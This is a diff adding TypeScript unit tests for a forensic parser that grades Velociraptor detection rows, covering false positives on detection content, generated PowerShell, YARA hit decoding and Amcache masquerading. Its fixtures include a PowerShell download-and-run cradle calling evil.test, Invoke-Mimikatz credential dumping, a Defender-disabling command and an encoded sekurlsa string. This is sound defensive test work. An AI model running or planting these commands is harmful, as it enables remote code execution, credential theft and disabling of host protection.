@@ -2935,3 +2935,267 @@ describe("parseVelociraptorJson — unrecognised detection-pack rows", () => {
     expect(e.severity).toBe("Info");
   });
 });
+
+// ─────────────────────────────────────────────────────────────────────────────────────────────
+// Detection CONTENT matched as if it were attacker content.
+//
+// A keyword rule pack sweeping the MFT matches the filenames of the detection stack itself: the
+// Sigma rules Velociraptor unpacks to run, and the EVTX-Attack-Samples corpus those rules were
+// written against. "win_alert_mimikatz_keywords.yml" is a rule ABOUT mimikatz; it is not mimikatz.
+// `.yms` (Velociraptor's compiled Sigma format) was already demoted — the same reasoning covers the
+// source `.yml`/`.yaml` and the `.evtx`/`.etl` sample logs, which in a real collection produced 47
+// of 48 High MFT events while the one true positive (a ransomware binary in ProgramData) sat among
+// them.
+describe("parseVelociraptorJson — a hit on detection content is not a hit on the host", () => {
+  const mftRow = (osPath: string) => ({
+    _Source: "DetectRaptor.Windows.Detection.MFT",
+    EventTime: "2026-07-02T12:37:57.1022486Z",
+    Detection: "Mimikatz Tools",
+    OSPath: osPath,
+    Fqdn: "H1",
+  });
+
+  it("demotes a hit on a .yml Sigma rule SOURCE file to Info", () => {
+    const r = parseVelociraptorJson(JSON.stringify([mftRow("C:\\rules\\win_alert_mimikatz_keywords.yml")]));
+    expect(r.events[0].severity).toBe("Info");
+    expect(r.events[0].description).toContain("Mimikatz Tools");
+  });
+
+  it("demotes a hit on a .evtx sample-log filename to Info", () => {
+    const r = parseVelociraptorJson(
+      JSON.stringify([
+        mftRow("\\\\.\\C:\\<Err>\\<Parent 99249-4 need 3>\\sysmon_10_lsass_mimikatz_sekurlsa.evtx"),
+      ]),
+    );
+    expect(r.events[0].severity).toBe("Info");
+  });
+
+  it("keeps full severity for an attacker file that merely ends in .yml", () => {
+    const r = parseVelociraptorJson(JSON.stringify([mftRow("\\\\.\\C:\\Users\\Public\\payload.yml")]));
+    expect(r.events[0].severity).toBe("High");
+    expect(r.iocs.some((i) => i.type === "file" && i.value.includes("payload.yml"))).toBe(true);
+  });
+
+  it("still demotes a bare .yms filename — that extension is Velociraptor's alone", () => {
+    const r = parseVelociraptorJson(JSON.stringify([mftRow("win_alert_mimikatz_keywords.yms")]));
+    expect(r.events[0].severity).toBe("Info");
+  });
+
+  it("emits no file IOC for the detection-content path", () => {
+    const r = parseVelociraptorJson(JSON.stringify([mftRow("C:\\rules\\file_event_win_bloodhound.yml")]));
+    expect(r.iocs.some((i) => i.type === "file")).toBe(false);
+  });
+
+  it("still grades a real executable on the host at full severity", () => {
+    const r = parseVelociraptorJson(
+      JSON.stringify([{ ...mftRow("\\\\.\\C:\\ProgramData\\locker.exe"), Detection: "Mimikatz Tools" }]),
+    );
+    expect(r.events[0].severity).toBe("High");
+  });
+});
+
+// ─────────────────────────────────────────────────────────────────────────────────────────────
+// Signed / generated PowerShell module bodies logged as 4104 script blocks.
+//
+// Windows compiles cdxml modules (NetSecurity, NetTCPIP, …) into PowerShell at import time and logs
+// the generated body to EID 4104. Sigma's broad "Potentially Malicious PwSh" and alias-obfuscation
+// rules match that generated scaffolding on its punctuation and alias density. In a real Hayabusa
+// collection this was 107 of 121 events — the single largest false-positive source in the run.
+describe("parseVelociraptorJson — generated PowerShell module bodies", () => {
+  const CDXML_BODY =
+    "#requires -version 3.0\r\ntry { Microsoft.PowerShell.Core\\Set-StrictMode -Off } catch { }\r\n" +
+    "$__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSource', $__cmdletization_values, $true, 'Default')\r\n";
+
+  const pwshRow = (scriptText: string) => ({
+    _Source: "Windows.Sigma.Base",
+    Timestamp: "2026-08-26T03:07:50Z",
+    Computer: "WIN-1",
+    Channel: "Microsoft-Windows-PowerShell/Operational",
+    EID: 4104,
+    Level: "medium",
+    Title: "Potentially Malicious PwSh",
+    Details: `ScriptBlock: ${scriptText}`,
+    _Event: {
+      System: {
+        EventID: { Value: 4104 },
+        Channel: "Microsoft-Windows-PowerShell/Operational",
+        Computer: "WIN-1",
+        TimeCreated: { SystemTime: 1764904070 },
+      },
+      EventData: { MessageNumber: 1, MessageTotal: 1, ScriptBlockText: scriptText },
+    },
+  });
+
+  it("demotes a cdxml-generated module body to Info", () => {
+    const r = parseVelociraptorJson(JSON.stringify([pwshRow(CDXML_BODY)]));
+    expect(r.events[0].severity).toBe("Info");
+  });
+
+  it("demotes a body carrying a COMPLETE Authenticode signature block to Info", () => {
+    const body =
+      "function Get-Thing { $x = 1 }\r\n# SIG # Begin signature block\r\n# MIIF...\r\n# SIG # End signature block\r\n";
+    const r = parseVelociraptorJson(JSON.stringify([pwshRow(body)]));
+    expect(r.events[0].severity).toBe("Info");
+  });
+
+  it("does not demote on a pasted begin-marker with no closing block", () => {
+    const body = "# SIG # Begin signature block\r\nInvoke-Mimikatz -DumpCreds\r\n";
+    const r = parseVelociraptorJson(JSON.stringify([pwshRow(body)]));
+    expect(r.events[0].severity).toBe("Medium");
+  });
+
+  it("never demotes a High verdict, whatever the script block is wrapped in", () => {
+    const body =
+      "# SIG # Begin signature block\r\n# MIIF...\r\n# SIG # End signature block\r\nInvoke-Mimikatz -DumpCreds\r\n";
+    const row = { ...pwshRow(body), Level: "high", Title: "Invoke-Mimikatz Execution" };
+    const r = parseVelociraptorJson(JSON.stringify([row]));
+    expect(r.events[0].severity).toBe("High");
+  });
+
+  it("reads the event id from a native System.EventID row", () => {
+    const row = {
+      _Source: "Windows.Detection.Sigma",
+      Rule: { Title: "Potentially Malicious PwSh", Level: "medium" },
+      System: {
+        EventID: 4104,
+        Channel: "Microsoft-Windows-PowerShell/Operational",
+        Computer: "WIN-1",
+        TimeCreated: "2026-08-26T03:07:50Z",
+      },
+      EventData: { ScriptBlockText: CDXML_BODY },
+    };
+    expect(parseVelociraptorJson(JSON.stringify([row])).events[0].severity).toBe("Info");
+  });
+
+  it("reads the event id from a System.EventID.Value written as a string", () => {
+    const row = {
+      _Source: "Windows.Detection.Sigma",
+      Rule: { Title: "Potentially Malicious PwSh", Level: "medium" },
+      System: {
+        EventID: { Value: "4104" },
+        Channel: "Microsoft-Windows-PowerShell/Operational",
+        Computer: "WIN-1",
+        TimeCreated: "2026-08-26T03:07:50Z",
+      },
+      EventData: { ScriptBlockText: CDXML_BODY },
+    };
+    expect(parseVelociraptorJson(JSON.stringify([row])).events[0].severity).toBe("Info");
+  });
+
+  it("keeps the rule's own grade for an attacker script block", () => {
+    const body = "IEX ((New-Object Net.WebClient).DownloadString('http://evil.test/a.ps1'))";
+    const r = parseVelociraptorJson(JSON.stringify([pwshRow(body)]));
+    expect(r.events[0].severity).toBe("Medium");
+  });
+
+  it("does not demote a signed module body that also carries real tradecraft", () => {
+    const body = `${CDXML_BODY}\r\nSet-MpPreference -DisableRealtimeMonitoring $true\r\n`;
+    const r = parseVelociraptorJson(JSON.stringify([pwshRow(body)]));
+    expect(r.events[0].severity).not.toBe("Info");
+  });
+});
+
+// ─────────────────────────────────────────────────────────────────────────────────────────────
+// The YARA hit's matched bytes.
+//
+// Velociraptor base64-encodes the bytes surrounding the match into `HitContext`. Scraping the whole
+// row for IOCs is wrong and stays wrong (#102) — but the matched string itself is the one thing that
+// tells an analyst WHY the rule fired, and on a pagefile scan it is the only evidence there is.
+describe("parseVelociraptorJson — YARA HitContext", () => {
+  const yaraRow = (hitContext: string) => ({
+    _Source: "DetectRaptor.Generic.Detection.YaraFile",
+    OSPath: "C:\\pagefile.sys",
+    Mtime: "2026-08-26T13:52:04Z",
+    Rule: "SIGNATURE_BASE_SUSP_Powershell_IEX_Download_Cradle",
+    Meta: { author: "Florian Roth", source_url: "https://github.test/rules/x.yar" },
+    HitContext: hitContext,
+  });
+
+  it("decodes an ASCII match into the description", () => {
+    // base64("IEX ((New-Object Net.WebClient).Download")
+    const r = parseVelociraptorJson(
+      JSON.stringify([yaraRow("SUVYICgoTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZA==")]),
+    );
+    expect(r.events[0].description).toContain("IEX ((New-Object Net.WebClient).Download");
+  });
+
+  it("decodes a UTF-16LE match into the description", () => {
+    // base64(utf16le("sekurlsa::logonpasswords"))
+    const r = parseVelociraptorJson(
+      JSON.stringify([yaraRow("cwBlAGsAdQByAGwAcwBhADoAOgBsAG8AZwBvAG4AcABhAHMAcwB3AG8AcgBkAHMA")]),
+    );
+    expect(r.events[0].description).toContain("sekurlsa::logonpasswords");
+  });
+
+  it("still refuses to scrape the rule's Meta as IOCs", () => {
+    const r = parseVelociraptorJson(
+      JSON.stringify([yaraRow("SUVYICgoTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZA==")]),
+    );
+    expect(r.iocs.some((i) => i.type === "url")).toBe(false);
+    expect(r.iocs.some((i) => i.type === "hash")).toBe(false);
+  });
+
+  it("adds no hit marker when HitContext decodes to nothing readable", () => {
+    const r = parseVelociraptorJson(JSON.stringify([yaraRow("AAECAwQF")]));
+    expect(r.events[0].description).not.toContain("[Hit:");
+    expect(r.events[0].description).toContain("C:\\pagefile.sys");
+  });
+});
+
+// ─────────────────────────────────────────────────────────────────────────────────────────────
+// Amcache: the name on disk versus the name in the version resource.
+//
+// The Amcache rule pack grades on WHAT the program is (an RMM tool → Medium). The row also carries
+// the binary's own version resource, and when that disagrees with the filename the row is evidence
+// of masquerading — a fact the pack's rule never looks at. binaryRenameImport already reasons about
+// this shape, but never sees an Amcache row: it arrives with a `Detection` verdict and is routed to
+// the detection mapper long before the Amcache branch.
+describe("parseVelociraptorJson — Amcache masquerade", () => {
+  const amcacheRow = (over: Record<string, unknown>) => ({
+    _Source: "DetectRaptor.Windows.Detection.Amcache",
+    Detection: {
+      Name: "RMM - RustDesk",
+      Criticality: "Medium",
+      PathName: "c:\\program files\\rustdesk\\rustdesk.exe",
+    },
+    KeyMTime: "2026-08-27T15:06:01Z",
+    EntryName: "RustDesk.exe",
+    EntryPath: "c:\\program files\\rustdesk\\rustdesk.exe",
+    Publisher: "microsoft corporation",
+    OriginalFileName: "rustdesk.exe",
+    SHA1: "d833f189f179c7384b225513e43e3e7d976d1d3f",
+    Fqdn: "H1",
+    ...over,
+  });
+
+  it("escalates a name/version-resource mismatch above the rule pack's grade", () => {
+    const e = parseVelociraptorJson(JSON.stringify([amcacheRow({ OriginalFileName: "notepad.exe" })]))
+      .events[0];
+    expect(e.severity).toBe("High");
+  });
+
+  it("names both spellings so the analyst sees the mismatch", () => {
+    const e = parseVelociraptorJson(JSON.stringify([amcacheRow({ OriginalFileName: "notepad.exe" })]))
+      .events[0];
+    expect(e.description).toContain("RustDesk.exe");
+    expect(e.description).toContain("notepad.exe");
+  });
+
+  it("tags the mismatch as T1036.005", () => {
+    const e = parseVelociraptorJson(JSON.stringify([amcacheRow({ OriginalFileName: "notepad.exe" })]))
+      .events[0];
+    expect(e.mitreTechniques).toContain("T1036.005");
+  });
+
+  it("leaves a row whose two names agree at the rule pack's own grade", () => {
+    const e = parseVelociraptorJson(JSON.stringify([amcacheRow({})])).events[0];
+    expect(e.severity).toBe("Medium");
+    expect(e.mitreTechniques).not.toContain("T1036.005");
+  });
+
+  it("does not fire on a version-resource name that differs only in case or extension casing", () => {
+    const e = parseVelociraptorJson(JSON.stringify([amcacheRow({ OriginalFileName: "RUSTDESK.EXE" })]))
+      .events[0];
+    expect(e.severity).toBe("Medium");
+  });
+});
